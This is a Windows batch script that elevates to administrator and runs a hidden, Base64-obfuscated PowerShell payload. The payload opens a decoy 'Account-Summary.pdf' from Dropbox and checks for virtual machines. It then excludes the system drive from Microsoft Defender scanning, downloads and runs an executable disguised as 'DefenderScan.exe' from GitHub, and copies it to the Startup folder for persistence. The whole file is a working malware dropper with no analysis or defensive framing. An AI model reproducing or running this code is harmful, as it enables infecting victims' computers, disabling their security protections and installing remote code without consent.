@echo off
:: Check for administrator privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting admin privileges...
    powershell.exe -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: Create the PowerShell script in AppData\Local\Temp
set "ps_script=%temp%\runtime_script.ps1"
(
echo $encodedCommand = 'RgB1AG4AYwB0AGkAbwBuACAAcABwAHgAIAB7AA0ACgAgACAAIAAgACQAcAB4ADEAIAA9ACAAWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMAUAByAGkAbgBjAGkAcABhAGwAXQAgAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEkAZABlAG4AdABpAHQAeQBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0ACgAKQANAAoAIAAgACAAIAByAGUAdAB1AHIAbgAgACQAcAB4ADEALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQAgACIAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAiACkADQAKAH0ADQAKAA0ACgBpAGYAIAAoAC0ATgBvAHQAIAAoAHAAcAB4ACkAKQAgAHsADQAKACAAIAAgACAAJABwAHgAMgAgAD0AIAAkAE0AeQBJAG4AdgBvAGMAYQB0AGkAbwBuAC4ATQB5AEMAbwBtAG0AYQBuAGQALgBQAGEAdABoAA0ACgAgACAAIAAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIALQBOAG8AUAByAG8AZgBpAGwAZQAiACwAIAAiAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIgAsACAAIgBCAHkAcABhAHMAcwAiACwAIAAiAC0ARgBpAGwAZQAiACwAIAAiAGAAIgAkAHAAeAAyAGAAIgAiACAALQBWAGUAcgBiACAAUgB1AG4AQQBzAA0ACgAgACAAIAAgAGUAeABpAHQADQAKAH0ADQAKAA0ACgAkAHAAeAAzACAAPQAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwAwADQAOQB2AGYANQB0ADQAbQBkAHcAMQBrAHYAaAA5AHUAcgB3AGsANQAvAEEAYwBjAG8AdQBuAHQALQBTAHUAbQBtAGEAcgB5AC4AcABkAGYAPwByAGwAawBlAHkAPQAzAHYAegA3AHUAMgA1AHoAZQBrAGIAbQA4AGUAMgBvADQAdQBkADMAcgA1AHEAdQA0ACYAcwB0AD0AegA4AHEAZQB0ADMAbwB3ACYAZABsAD0AMQAiAA0ACgAkAHAAeAA0ACAAPQAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEQAbwB3AG4AbABvAGEAZABzAFwAQQBjAGMAbwB1AG4AdAAtAFMAdQBtAG0AYQByAHkALgBwAGQAZgAiAA0ACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABwAHgAMwAgAC0ATwB1AHQARgBpAGwAZQAgACQAcAB4ADQADQAKAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACQAcAB4ADQADQAKAA0ACgAkAHAAeAA1ACAAPQAgAEcAZQB0AC0AVwBtAGkATwBiAGoAZQBjAHQAIABNAFMAQQBjAHAAaQBfAFQAaABlAHIAbQBhAGwAWgBvAG4AZQBUAGUAbQBwAGUAcgBhAHQAdQByAGUAIAAtAE4AYQBtAGUAcwBwAGEAYwBlACAAIgByAG8AbwB0AFwAdwBtAGkAIgAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBFAHgAcABhAG4AZABQAHIAbwBwAGUAcgB0AHkAIABDAHUAcgByAGUAbgB0AFQAZQBtAHAAZQByAGEAdAB1AHIAZQANAAoADQAKAGkAZgAgACgALQBuAG8AdAAgACQAcAB4ADUAKQAgAHsADQAKACAAIAAgACAAZQB4AGkAdAANAAoAfQANAAoADQAKACQAcAB4ADYAIAA9ACAAIgAkAGUAbgB2ADoAUwB5AHMAdABlAG0ARAByAGkAdgBlACIADQAKAEEAZABkAC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEUAeABjAGwAdQBzAGkAbwBuAFAAYQB0AGgAIAAkAHAAeAA2AA0ACgANAAoAJABwAHgANwAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AUwBjAHIAaQBwAHQAagB1AG4AawBpAGUAMQAvAHoAegB6AHoALwByAGEAdwAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8ARABlAGYAZQBuAGQAZQByAFMAYwBhAG4ALgBlAHgAZQAiAA0ACgAkAHAAeAA4ACAAPQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABEAGUAZgBlAG4AZABlAHIAUwBjAGEAbgAuAGUAeABlACIADQAKACQAcAB4ADkAIAA9ACAAQAAiAA0ACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABwAHgANwAgAC0ATwB1AHQARgBpAGwAZQAgACQAcAB4ADgADQAKAGkAZgAgACgAWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApAC4ARwByAG8AdQBwAHMAIAAtAG0AYQB0AGMAaAAgACcAUwAtADEALQA1AC0AMwAyAC0ANQA0ADQAJwApACAAewANAAoAIAAgACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAkAHAAeAA4ACAALQBWAGUAcgBiACAAUgB1AG4AQQBzAA0ACgB9ACAAZQBsAHMAZQAgAHsADQAKACAAIAAgACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABwAHgAOAANAAoAfQANAAoAIgBAAA0ACgAkAHAAeAAxADAAIAA9ACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAHAAcAB4AFMAYwByAGkAcAB0AC4AcABzADEAIgANAAoAJABwAHgAOQAgAHwAIABTAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAtAFAAYQB0AGgAIAAkAHAAeAAxADAADQAKAA0ACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAcABvAHcAZQByAHMAaABlAGwAbAAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABAACgAJwAtAE4AbwBQAHIAbwBmAGkAbABlACcALAAgACcALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAnACwAIAAnAEIAeQBwAGEAcwBzACcALAAgACcALQBGAGkAbABlACcALAAgACIAYAAiACQAcAB4ADEAMABgACIAIgApACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgANAAoADQAKACQAcAB4ADEAMQAgAD0AIABbAFMAeQBzAHQAZQBtAC4ASQBPAC4AUABhAHQAaABdADoAOgBDAG8AbQBiAGkAbgBlACgAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEALAAgACIATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUwB0AGEAcgB0ACAATQBlAG4AdQBcAFAAcgBvAGcAcgBhAG0AcwBcAFMAdABhAHIAdAB1AHAAIgApAA0ACgAkAHAAeAAxADIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAFAAYQB0AGgAXQA6ADoAQwBvAG0AYgBpAG4AZQAoACQAcAB4ADEAMQAsACAAIgBEAGUAZgBlAG4AZABlAHIAUwBjAGEAbgAuAGUAeABlACIAKQANAAoADQAKAHQAcgB5ACAAewANAAoAIAAgACAAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACQAcAB4ADgAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACQAcAB4ADEAMgAgAC0ARgBvAHIAYwBlAA0ACgB9ACAAYwBhAHQAYwBoACAAewANAAoAIAAgACAAIABlAHgAaQB0AA0ACgB9AA0ACgA='
echo powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encodedCommand
) > "%ps_script%"

:: Execute the PowerShell script as admin
powershell -ExecutionPolicy Bypass -File "%ps_script%" -WindowStyle Hidden

exit
